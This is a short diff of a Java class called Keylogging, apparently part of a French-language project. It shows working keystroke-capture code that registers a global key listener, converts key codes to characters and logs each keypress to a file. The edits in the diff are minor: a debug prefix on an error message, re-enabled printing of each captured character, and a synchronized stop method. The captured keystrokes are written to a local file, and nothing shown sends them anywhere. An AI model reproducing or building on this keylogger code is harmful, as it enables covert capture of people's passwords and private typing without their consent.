@@ -39,22 +39,23 @@ public class Keylogging extends Thread {
 
 		if (f.exists())
 			this.start();
+
 		else
 			System.out
-					.println("Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
+		.println("[debug] Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
 	}
 
 	public void run() {
 		new GlobalKeyListener().addKeyListener(new KeyListener() {
-
 			@Override
 			public void keyPressed(de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
+
 				try {
 					code = event.getVirtualKeyCode();
 					char character = codeToChar(code);
 					pw.print(character);
-					// System.out.println(character);
+					System.out.println(character);
 					pw.flush();
 					if (nombredecaractereparligne++ > 40) {
 						pw.println();
@@ -526,7 +527,7 @@ public class Keylogging extends Thread {
 		return key;
 	}
 
-	public void arreteKeylog() {
+	public synchronized void arreteKeylog() {
 		this.stop();
 		pw.close();
 	}
